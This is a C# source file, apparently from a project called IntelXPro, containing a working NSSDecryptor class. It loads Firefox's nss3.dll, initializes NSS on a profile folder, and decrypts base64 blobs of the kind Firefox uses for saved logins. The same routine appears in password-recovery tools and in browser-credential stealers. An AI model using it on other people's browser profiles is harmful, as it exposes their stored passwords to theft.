using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace IntelXPro.src.IntelXPro.Dependencies.Encryption
{
    public static class NSSDecryptor
    {
        public struct SECItem
        {
            public int Type;

            public IntPtr Data;

            public int Len;
        }

        [DllImport("nss3.dll", CallingConvention = CallingConvention.Cdecl)]
        private static extern int NSS_Init(string configdir);

        [DllImport("nss3.dll", CallingConvention = CallingConvention.Cdecl)]
        private static extern int NSS_Shutdown();

        [DllImport("nss3.dll", CallingConvention = CallingConvention.Cdecl)]
        private static extern int PK11SDR_Decrypt(ref SECItem data, ref SECItem result, int cx);

        public static bool Initialize(string profilePath)
        {
            try
            {
                string text = "C:\\Program Files\\Mozilla Firefox";
                if (!Directory.Exists(text))
                {
                    return false;
                }
                string environmentVariable = Environment.GetEnvironmentVariable("PATH");
                environmentVariable = environmentVariable + ";" + text;
                Environment.SetEnvironmentVariable("PATH", environmentVariable);
                return NSS_Init(profilePath) == 0;
            }
            catch
            {
                return false;
            }
        }

        public static string Decrypt(string base64)
        {
            try
            {
                byte[] array = Convert.FromBase64String(base64);
                if (array.Length == 0)
                {
                    return null;
                }
                SECItem data = new SECItem
                {
                    Data = Marshal.AllocHGlobal(array.Length),
                    Len = array.Length,
                    Type = 0
                };
                Marshal.Copy(array, 0, data.Data, array.Length);
                SECItem result = default(SECItem);
                int num = PK11SDR_Decrypt(ref data, ref result, 0);
                Marshal.FreeHGlobal(data.Data);
                if (num != 0 || result.Data == IntPtr.Zero)
                {
                    return null;
                }
                byte[] array2 = new byte[result.Len];
                Marshal.Copy(result.Data, array2, 0, result.Len);
                return Encoding.UTF8.GetString(array2);
            }
            catch
            {
                return null;
            }
        }
    }
}
